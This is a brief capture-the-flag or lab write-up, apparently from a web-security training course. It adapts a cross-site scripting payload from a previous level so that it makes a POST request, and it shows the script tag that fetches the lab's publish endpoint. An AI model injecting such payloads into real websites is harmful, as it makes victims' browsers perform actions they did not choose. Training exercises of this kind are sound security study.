This level is pretty much the same as the previous level, except we need to make a POST request instead of a GET request, so it should be pretty simple to modify the previous level's XSS payload.

```html
<script>fetch("http://challenge.localhost/publish", {method:"POST"})</script>
```